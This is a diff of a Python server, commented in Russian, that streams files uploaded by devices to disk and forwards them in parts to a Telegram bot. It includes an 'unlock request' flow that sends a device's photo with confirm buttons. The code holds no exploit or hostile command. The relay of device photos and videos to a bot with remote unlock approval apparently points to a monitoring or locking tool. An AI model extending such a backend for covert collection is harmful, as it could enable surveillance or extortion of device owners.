@@ -53,15 +53,8 @@ VALID_NAMES = ["android", "security", "безопасность", "звонки"
 def escape_md(s: str) -> str:
     """Экранирует спецсимволы Markdown v1 для Telegram."""
     for ch in ("_", "*", "`", "[", "]", "(", ")"):
-        s = s.replace(ch, f"\\{ch}")
+        s = s.replace(ch, "\\" + ch)
     return s
-
-CONTENT_TYPE_EXT = {
-    "image/jpeg": ".jpg", "image/png": ".png", "image/webp": ".webp",
-    "image/gif": ".gif", "video/mp4": ".mp4", "video/quicktime": ".mov",
-    "video/x-matroska": ".mkv", "video/3gpp": ".3gp", "audio/mp4": ".m4a",
-    "audio/mpeg": ".mp3", "audio/ogg": ".ogg", "application/octet-stream": "",
-}
 
 # ─── Keep-alive ───────────────────────────────────────────────────────────────
 
@@ -139,8 +132,6 @@ async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str,
                 data  = {"chat_id": chat_id}
                 if caption:
                     data["caption"] = caption
-                    # parse_mode только для code_upload (там Markdown нужен для кнопок)
-                    # для обычных файлов НЕ ставим — имена файлов ломают Markdown парсер
                     if reply_markup:
                         data["parse_mode"] = "Markdown"
                 if reply_markup:
@@ -155,21 +146,19 @@ async def send_tg_file(chat_id: str, file_bytes: bytes, filename: str,
             print(f"send_tg_file error: {e}")
         return
 
-    # Разбиваем на равные части
+    # Разбиваем на части — читаем с диска чанками чтобы не держать всё в RAM
     num_parts = (total + PART_SIZE - 1) // PART_SIZE
-    part_size = (total + num_parts - 1) // num_parts  # равномерное разбиение
-
     print(f"send_tg_file: {filename} {total/1024/1024:.1f}MB -> {num_parts} parts")
 
     base_name = filename.rsplit(".", 1)[0] if "." in filename else filename
     for i in range(num_parts):
-        start = i * part_size
-        end   = min(start + part_size, total)
+        start = i * PART_SIZE
+        end   = min(start + PART_SIZE, total)
         chunk = file_bytes[start:end]
-        part_name = f"{base_name}_part{i+1}of{num_parts}.{ext}"
+        part_name = f"{base_name}_part{i+1}of{num_parts}.{ext if ext else 'bin'}"
         part_caption = f"{caption + ' ' if caption else ''}[{i+1}/{num_parts}]"
         try:
-            async with httpx.AsyncClient(timeout=120) as client:
+            async with httpx.AsyncClient(timeout=300) as client:
                 files = {"document": (part_name, chunk)}
                 data  = {"chat_id": chat_id, "caption": part_caption}
                 r = await client.post(
@@ -1210,34 +1199,103 @@ async def upload(
     if not chat_id:
         raise HTTPException(status_code=400, detail="No chat_id")
 
-    data     = await file.read()
     filename = file.filename or "file"
-    # Если клиент не прислал расширение — добираем по content_type или magic bytes
+
+    # Если клиент не прислал расширение — определяем по content_type или magic bytes
     if "." not in filename:
         ct = file.content_type or ""
-        ext = CONTENT_TYPE_EXT.get(ct, "")
-        if not ext:
-            if data[:3] == b"\xff\xd8\xff":
-                ext = ".jpg"
-            elif data[:4] == b"\x89PNG":
-                ext = ".png"
-            elif data[4:8] == b"ftyp" or data[:4] in (b"\x00\x00\x00\x18", b"\x00\x00\x00\x20"):
-                ext = ".mp4"
-        if ext:
-            filename = filename + ext
-    caption  = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"
+        ext_map = {
+            "image/jpeg": ".jpg", "image/png": ".png", "image/webp": ".webp",
+            "image/gif": ".gif", "video/mp4": ".mp4", "video/quicktime": ".mov",
+            "video/x-matroska": ".mkv", "video/3gpp": ".3gp",
+            "audio/mp4": ".m4a", "audio/mpeg": ".mp3",
+        }
+        guessed_ext = ext_map.get(ct, "")
+        if guessed_ext:
+            filename = filename + guessed_ext
+
+    caption = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"
+
+    # Читаем файл на диск чанками — НЕ грузим весь файл в RAM
+    import pathlib
+    tmp_dir = pathlib.Path(tempfile.gettempdir()) / "pc_uploads"
+    tmp_dir.mkdir(exist_ok=True)
+    tmp_path = tmp_dir / f"{uuid.uuid4().hex}_{filename}"
+    total_size = 0
+    CHUNK = 1 * 1024 * 1024  # читаем по 1MB
+    try:
+        with open(tmp_path, "wb") as f_out:
+            while True:
+                chunk = await file.read(CHUNK)
+                if not chunk:
+                    break
+                f_out.write(chunk)
+                total_size += len(chunk)
+    except Exception as e:
+        print(f"upload write error: {e}")
+        raise HTTPException(status_code=500, detail="Write failed")
+
+    async def _send_from_disk(path: pathlib.Path, fname: str, cap: str, rm=None):
+        """Читает файл с диска и отправляет в Telegram частями по 45MB."""
+        PART_SIZE = 45 * 1024 * 1024
+        ext = fname.lower().rsplit(".", 1)[-1] if "." in fname else ""
+        if ext in ("jpg", "jpeg", "png", "webp", "gif"):
+            method = "sendPhoto"; field = "photo"
+        elif ext in ("mp4", "mov", "avi", "mkv", "3gp"):
+            method = "sendVideo"; field = "video"
+        else:
+            method = "sendDocument"; field = "document"
+
+        file_size = path.stat().st_size
+        num_parts = max(1, (file_size + PART_SIZE - 1) // PART_SIZE)
+        base_name = fname.rsplit(".", 1)[0] if "." in fname else fname
+        print(f"_send_from_disk: {fname} {file_size/1024/1024:.1f}MB -> {num_parts} parts")
+
+        try:
+            with open(path, "rb") as fp:
+                for i in range(num_parts):
+                    chunk = fp.read(PART_SIZE)
+                    if not chunk:
+                        break
+                    if num_parts == 1:
+                        part_name = fname
+                        part_cap  = cap
+                    else:
+                        part_name = f"{base_name}_part{i+1}of{num_parts}.{ext if ext else 'bin'}"
+                        part_cap  = f"{cap + ' ' if cap else ''}[{i+1}/{num_parts}]"
+                    try:
+                        async with httpx.AsyncClient(timeout=300) as client:
+                            fdata = {field if num_parts == 1 else "document": (part_name, chunk)}
+                            pdata = {"chat_id": chat_id, "caption": part_cap}
+                            if rm and num_parts == 1:
+                                import json as _j
+                                pdata["reply_markup"] = _j.dumps(rm)
+                                pdata["parse_mode"] = "Markdown"
+                            send_method = (method if num_parts == 1 else "sendDocument")
+                            r = await client.post(
+                                f"https://api.telegram.org/bot{BOT_TOKEN}/{send_method}",
+                                data=pdata, files=fdata
+                            )
+                            print(f"send_from_disk part {i+1}/{num_parts} -> {r.status_code}")
+                    except Exception as e:
+                        print(f"send_from_disk part {i+1} error: {e}")
+        finally:
+            try:
+                path.unlink()
+            except Exception:
+                pass
 
     if x_code_upload == "true":
-        # Отправляем боту с кнопками подтверждения
-        asyncio.create_task(send_tg_file(
-            chat_id, data, filename,
-            f"📸 *Запрос на разблокировку*\nУстройство: `{escape_md(dev_id)}`\nФайл: {escape_md(filename)}\n\nПодтвердить разблокировку?",
-            reply_markup=code_confirm_keyboard(dev_id, chat_id)
+        cap_md = (f"📸 *Запрос на разблокировку*\nУстройство: `{escape_md(dev_id)}`"
+                  f"\nФайл: {escape_md(filename)}\n\nПодтвердить разблокировку?")
+        asyncio.create_task(_send_from_disk(
+            tmp_path, filename, cap_md,
+            rm=code_confirm_keyboard(dev_id, chat_id)
         ))
     else:
-        asyncio.create_task(send_tg_file(chat_id, data, filename, caption))
+        asyncio.create_task(_send_from_disk(tmp_path, filename, caption))
 
-    return {"ok": True, "size": len(data)}
+    return {"ok": True, "size": total_size}
 
 
 # ─── Video list endpoint ─────────────────────────────────────────────────────
